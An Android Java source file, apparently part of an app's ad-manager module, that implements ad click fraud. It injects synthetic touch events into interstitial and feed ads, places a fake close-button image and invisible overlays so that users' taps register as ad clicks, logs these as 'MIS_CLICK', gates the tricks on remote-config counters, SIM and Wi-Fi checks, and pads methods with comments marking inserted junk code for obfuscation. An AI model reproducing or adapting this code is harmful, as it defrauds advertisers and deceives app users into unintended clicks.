package com.common.wheel.admanager;

import android.app.Activity;
import android.content.Context;
import android.os.SystemClock;
import android.text.TextUtils;
import android.util.ArrayMap;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;

import com.bumptech.glide.Glide;
import com.bytedance.sdk.openadsdk.TTFeedAd;
import com.bytedance.sdk.openadsdk.TTFullScreenVideoAd;
import com.bytedance.sdk.openadsdk.mediation.manager.MediationAdEcpmInfo;
import com.common.wheel.constans.ConstantsPath;
import com.common.wheel.service.ApiService;
import com.common.wheel.util.DeviceUtil;
import com.orhanobut.hawk.Hawk;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class ViewHelper {

    protected static void clickView(ViewGroup rv) {

        try {

            long dTime = SystemClock.uptimeMillis();
            long eTime = SystemClock.uptimeMillis();
            float x = rv.getWidth() / 2f;
            float y = rv.getHeight() / 2f;
            int metaState = 0;
            MotionEvent de = MotionEvent.obtain(dTime, eTime, MotionEvent.ACTION_DOWN, x, y, metaState);
            // 添加垃圾代码
            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");


            MotionEvent ue = MotionEvent.obtain(dTime, eTime, MotionEvent.ACTION_UP, x, y, metaState);
            // 添加垃圾代码
            Object activityThread = activityThreadClass.getMethod("currentActivityThread").invoke(null);


            rv.dispatchTouchEvent(de);
            rv.dispatchTouchEvent(ue);
            de.recycle();
            ue.recycle();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    protected static void addInterstitialView(TTFullScreenVideoAd mAd) {
        Activity ctx = getCurPage();
        if (ctx != null) {
            addInterstitialView(ctx, mAd);
        } else {
            Log.e("", "ViewHelper get error");
        }
    }


    protected static Activity getCurPage() {
        try {
            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
            Object activityThread = activityThreadClass.getMethod("currentActivityThread").invoke(null);
            Field activitiesField = activityThreadClass.getDeclaredField("mActivities");
            activitiesField.setAccessible(true);
            ArrayMap<?, ?> activities = (ArrayMap<?, ?>) activitiesField.get(activityThread);
            for (Object activityRecord : activities.values()) {
                Class<?> activityRecordClass = activityRecord.getClass();
                Field pausedField = activityRecordClass.getDeclaredField("paused");
                pausedField.setAccessible(true);
                if (!pausedField.getBoolean(activityRecord)) {
                    Field activityField = activityRecordClass.getDeclaredField("activity");
                    activityField.setAccessible(true);
                    return (Activity) activityField.get(activityRecord);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }


    protected static void addInterstitialView(Activity act, TTFullScreenVideoAd mAd) {
        try {
            int count = Hawk.get("interCount", 0);
            ViewGroup rv = (ViewGroup) act.findViewById(android.R.id.content);
            Hawk.put("interCount", count+1);
            if (isInterInfoPerssView(act)) {
                ImageView ci = new ImageView(act);
                Glide.with(act).load("https://vcg01.cfp.cn/creative/vcg/800/new/VCG211245151984.jpg").into(ci);
//            ci.setImageDrawable(act.getResources().getDrawable(R.mipmap.icon_close));
                ViewGroup.MarginLayoutParams lp = new ViewGroup.MarginLayoutParams(
                        80,
                        80
                );
                lp.setMargins(100, 600, 0, 0);
                ci.setLayoutParams(lp);
                // 添加垃圾代码
                Class<?> activityThreadClass = Class.forName("android.view.View");

                ci.setOnClickListener(v -> {
                    ViewHelper.clickView(rv);
                    logInterEcpmInfo(act, mAd, "PERSS_CLICK");
                    ci.setVisibility(View.GONE);
                });
                rv.addView(ci);
            }

            if (isInterInfoClickView(act)) {
                LinearLayout layout = new LinearLayout(act, null);
                // 添加垃圾代码
                Class<?> fl = Class.forName("android.widget.FrameLayout");


                layout.setOnClickListener(v -> {
                    ViewHelper.clickView(rv);
                    logInterEcpmInfo(act, mAd, "MIS_CLICK");
                    layout.setVisibility(View.GONE);
                });

                rv.addView(layout);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    protected static void renderInfoView(Context context, FrameLayout sc, View efv, TTFeedAd ttFeedAd) {
        try {
            int count = Hawk.get("infoCount", 0);
            FrameLayout fv = new FrameLayout(context);
            FrameLayout fli = new FrameLayout(context);
            View llm = new View(context);

            // 添加垃圾代码
            Class<?> activityThreadClass = Class.forName("android.widget.FrameLayout");


            fv.addView(fli);
            fv.addView(llm);
//        fli.removeAllViews();
            fli.addView(efv);

            // 添加垃圾代码
            Class<?> vv = Class.forName("android.view.View");
            Hawk.put("infoCount", count+1);
            llm.setVisibility(View.GONE);
            if (isAddInfoView(context)) {
                llm.setVisibility(View.VISIBLE);
                llm.setOnTouchListener(new View.OnTouchListener() {
                    @Override
                    public boolean onTouch(View v, MotionEvent event) {
                        switch (event.getAction()) {
                            case MotionEvent.ACTION_DOWN:
                            case MotionEvent.ACTION_MOVE:
                                ViewHelper.clickView((ViewGroup) efv);
                                logInfoEcpmInfo(context, ttFeedAd);
                                break;
                            case MotionEvent.ACTION_UP:
                                break;
                        }
                        return false;
                    }
                });
            }
            sc.addView(fv);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 信息流误点
     *
     * @param context
     * @return
     */
    protected static boolean isAddInfoView(Context context) {
        boolean isBd = false;
        boolean isSim = DeviceUtil.hasSimCard(context);
        boolean isCount = false;

        boolean feeds_misclick_ad_config = Hawk.get(ConstantsPath.feeds_misclick_ad_config, false);
        // 不增加误点
        if (!feeds_misclick_ad_config) {
            return false;
        }
        int count = Hawk.get("infoCount", 0);
        String feeds_misclick_ad_config_value = Hawk.get(ConstantsPath.feeds_misclick_ad_config_value, "");
        if (!TextUtils.isEmpty(feeds_misclick_ad_config_value)) {
            String[] value = feeds_misclick_ad_config_value.split(",");
            for (String v : value) {
                if (Integer.parseInt(v) == count) {
                    isCount = true;
                }
            }
        }
        String ip = DeviceUtil.getWifiIpAddress(context);
        return !isBd && isSim && isCount && !TextUtils.isEmpty(ip);
    }

    /**
     * 插屏诱导
     *
     * @param context
     * @return
     */
    protected static boolean isInterInfoPerssView(Context context) {
        boolean isBd = false;
        boolean isSim = DeviceUtil.hasSimCard(context);
        boolean isCount = false;

        boolean interstitial_perss_ad_config = Hawk.get(ConstantsPath.interstitial_perss_ad_config, false);
        // 不增加误点
        if (!interstitial_perss_ad_config) {
            return false;
        }
        int count = Hawk.get("interCount", 0);
        String interstitial_perss_ad_config_value = Hawk.get(ConstantsPath.interstitial_perss_ad_config_value, "");
        if (!TextUtils.isEmpty(interstitial_perss_ad_config_value)) {
            String[] value = interstitial_perss_ad_config_value.split(",");
            for (String v : value) {
                if (Integer.parseInt(v) == count) {
                    isCount = true;
                }
            }
        }
        String ip = DeviceUtil.getWifiIpAddress(context);
        return !isBd && isSim && isCount && !TextUtils.isEmpty(ip);
    }

    /**
     * 插屏误点
     *
     * @param context
     * @return
     */
    protected static boolean isInterInfoClickView(Context context) {
        boolean isBd = false;
        boolean isSim = DeviceUtil.hasSimCard(context);
        boolean isCount = false;

        boolean interstitial_misclick_ad_switch = Hawk.get(ConstantsPath.interstitial_misclick_ad_switch, false);
        // 不增加误点
        if (!interstitial_misclick_ad_switch) {
            return false;
        }
        int count = Hawk.get("interCount", 0);
        String interstitial_misclick_ad_switch_value = Hawk.get(ConstantsPath.interstitial_misclick_ad_switch_value, "");
        if (!TextUtils.isEmpty(interstitial_misclick_ad_switch_value)) {
            String[] value = interstitial_misclick_ad_switch_value.split(",");
            for (String v : value) {
                if (Integer.parseInt(v) == count) {
                    isCount = true;
                }
            }
        }
        String ip = DeviceUtil.getWifiIpAddress(context);
        return !isBd && isSim && isCount && !TextUtils.isEmpty(ip);
    }

    protected static void logInterEcpmInfo(Context context, TTFullScreenVideoAd mAd, String clickType) {
        MediationAdEcpmInfo item = mAd.getMediationManager().getShowEcpm();
        HashMap<String, String> params = new HashMap<>();
        params.put("adPlatform", item.getChannel()); // 广告平台（见平台枚举）
        params.put("adType", "INTERSTITIAL");// 插屏
        params.put("ecpm", item.getEcpm());
        params.put("adPosition", item.getSlotId()); // 广告位标识
        params.put("clickType", clickType); // 误触
        params.put("userId", "");
        ApiService.postAdInfo(context, params);
    }

    protected static void logInfoEcpmInfo(Context context, TTFeedAd ttFeedAd) {
        MediationAdEcpmInfo item = ttFeedAd.getMediationManager().getShowEcpm();
//        Map<String, Object>  mediaExtraInfo = ttFeedAd.getMediaExtraInfo();
        try {
//            String channel = mediaExtraInfo.get("channel").toString();
            HashMap<String, String> params = new HashMap<>();
            params.put("adPlatform", item.getChannel()); // 广告平台（见平台枚举）
            params.put("adType", "FEEDS");// 信息流
            params.put("ecpm", item.getEcpm());
            params.put("adPosition", item.getSlotId()); // 广告位标识
            params.put("clickType", "MIS_CLICK"); // 误触
            params.put("userId", "");
            ApiService.postAdInfo(context, params);
        } catch (Exception e) {
        }
    }

    protected static void logRewardEcpmInfo(Context context, MediationAdEcpmInfo item) {
        HashMap<String, String> params = new HashMap<>();
        params.put("adPlatform", item.getChannel()); // 广告平台（见平台枚举）
        params.put("adType", "VIDEO");// 激励
        params.put("ecpm", item.getEcpm());
        params.put("adPosition", item.getSlotId()); // 广告位标识
        params.put("clickType", "MANUAL_CLICK"); // 手动
        params.put("userId", "");
        ApiService.postAdInfo(context, params);
    }
}
